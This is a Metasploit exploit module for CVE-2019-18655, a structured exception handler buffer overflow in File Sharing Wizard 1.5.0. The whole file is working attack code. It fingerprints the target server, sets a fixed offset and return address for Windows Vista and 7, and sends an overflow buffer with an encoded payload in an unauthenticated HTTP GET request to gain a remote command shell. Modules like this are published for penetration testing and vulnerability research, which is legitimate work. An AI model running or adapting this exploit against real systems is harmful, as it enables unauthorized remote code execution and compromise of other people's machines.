##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Exploit Title: File Sharing Wizard Version 1.5 - GET Structured Exception Handler based buffer overflow
# Date: 2019-11-08
# Exploit Author: Armando Huesca Prida
# Software Link: https://file-sharing-wizard.soft112.com
# Version: File Sharing Wizard version 1.5.0 build 2008
# Tested on: Microsoft Windows Vista Ultimate 6.0.6002 Service Pack 2 Build 6002 / Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601
# CVE : 2019-18655
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Seh

  def initialize(info = {})
    super update_info(info,
                      'Name' => 'File Sharing Wizard Version 1.5 - GET Structured Exception Handler based buffer overflow',
                      'Description' => %q(
        This module exploits a Structured Exception Handler based buffer overflow vulnerability in File Sharing Wizard version 1.5.0 build 2008. An unauthenticated attacker is able to perform remote command execution and obtain a command shell by sending a HTTP GET request including the malicious payload in the URL. A similar issue to CVE-2019-17415, CVE-2019-16724, and CVE-2010-2331.
      ),
                      'Author' => [
                        'Armando Huesca Prida <armandohuesca[at]icloud[dot]com>' # Metasploit Module & Vulnerability Discovery.
                      ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                          [
                            %w[CVE 2019-18655],
		        ['URL','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18655'],
			['URL','https://www.0xhuesca.com/2019/11/cve-2019-18655.html']
				
                          ],
                      'Payload' =>
                          {
                              'Space'    => 3900,
                              'BadChars' => "\x00\x20"
                          },
                      'DisclosureDate' => '2019-11-08',
                      'DefaultOptions' =>
                          {
                            'RPORT' => 80,
                          },
                      'Platform'       => 'win',
                      'Arch' => [ ARCH_X86 ],
                      'Targets' =>
                          [
                            ['Microsoft Windows Vista Ultimate 6.0.6002 Service Pack 2 Build 6002 / Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601', { 'Offset' => 1035, 'Ret' => 0x7c37576d }] 
                          ])
  end

  def check
    res = send_request_cgi
    if res.nil?
      fail_with(Failure::Unreachable, 'Connection timed out...')
    end
    
    if res.code && res.code == 401 && res.headers['WWW-Authenticate'].include?('Basic realm="File Sharing Wizard"')
      CheckCode::Detected
    else
      CheckCode::Safe
    end
  end

  def exploit
    buf = '//.:/'
    buf << rand_text_english(target['Offset'])
    buf << generate_seh_record(target.ret)
    buf << make_nops(59)
    buf << payload.encoded
    print_status('Sending payload to target...')
    send_request_raw({ 'method' => 'GET', 'uri' => buf }, 0)
  end

end
